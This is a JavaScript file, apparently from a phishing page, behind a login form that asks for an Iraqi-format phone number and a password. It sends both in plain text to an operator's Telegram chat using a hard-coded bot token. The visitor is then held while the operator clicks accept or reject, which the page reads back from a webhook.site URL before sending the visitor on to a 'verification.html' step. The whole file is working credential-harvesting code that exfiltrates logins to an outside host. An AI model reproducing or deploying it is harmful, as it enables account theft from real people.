// إعدادات تلغرام
const TELEGRAM_BOT_TOKEN = "8125381566:AAGfyKuODnK_RufFKXOQ15tS9ar_lBFBot4";
const TELEGRAM_CHAT_ID = "-4625923889";
// هذا هو رابط webhook.site الخاص بك
const WEBHOOK_URL = "https://webhook.site/d96d6b9c-a452-47a9-9f36-6a58e2a027a4";

function generateReqId() {
  return Math.random().toString(36).substring(2, 12) + Date.now();
}

function showMsg(type, text) {
  const successDiv = document.getElementById("form-done");
  const failDiv = document.getElementById("form-fail");
  successDiv.style.display = "none";
  failDiv.style.display = "none";
  if(type === "wait" || type === "ok") {
    successDiv.textContent = text;
    successDiv.style.display = "block";
  } else if(type === "err") {
    failDiv.textContent = text;
    failDiv.style.display = "block";
  }
}

document.getElementById("signin").onsubmit = async function(e){
  e.preventDefault();
  const phone = document.getElementById("phonenumber").value.trim();
  const password = document.getElementById("password").value.trim();

  if(!/^(079|078|077)[0-9]{7}$/.test(phone) || password.length < 3){
    showMsg("err", "يرجى إدخال البيانات بشكل صحيح!");
    return;
  }

  const reqId = generateReqId();

  const msgText = `🚨 محاولة تسجيل دخول جديدة:
رقم الهاتف: \`${phone}\`
كلمة السر: \`${password}\`

قبول أو رفض؟

#id_${reqId}`;

  const buttons = {
    inline_keyboard: [
      [
        { text: "✅ قبول", callback_data: `accept_${reqId}` },
        { text: "❌ رفض",  callback_data: `reject_${reqId}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        chat_id: TELEGRAM_CHAT_ID,
        text: msgText,
        parse_mode: "Markdown",
        reply_markup: JSON.stringify(buttons)
      })
    });
  } catch (err) {
    showMsg("err", "خطأ في الاتصال بتلغرام!");
    return;
  }

  showMsg("wait", "بانتظار موافقة المسؤول...");

  let tries = 0;
  const maxTries = 60; // 3 دقائق
  const pollInterval = setInterval(async () => {
    tries++;
    try {
      // جلب الردود من webhook.site (آخر 10 رسائل)
      const res = await fetch(WEBHOOK_URL + "?_=" + Date.now(), {headers:{Accept:"application/json"}});
      const data = await res.json();
      let found = false;
      for(const item of data.data || []) {
        if(item && item.content) {
          if(item.content.includes(`ACCEPT_${reqId}`)) {
            clearInterval(pollInterval);
            showMsg("ok", "تم قبول تسجيل الدخول. جارٍ التحويل...");
            setTimeout(() => { window.location.href = "verification.html"; }, 1500);
            found = true;
            break;
          }
          if(item.content.includes(`REJECT_${reqId}`)) {
            clearInterval(pollInterval);
            showMsg("err", "لقد قمت بادخال المعلومات بشكل غير صحيح");
            found = true;
            break;
          }
        }
      }
      if(!found && tries > maxTries){
        clearInterval(pollInterval);
        showMsg("err", "انتهت مهلة الانتظار. حاول مرة أخرى.");
      }
    } catch (err) {}
  }, 3000);
};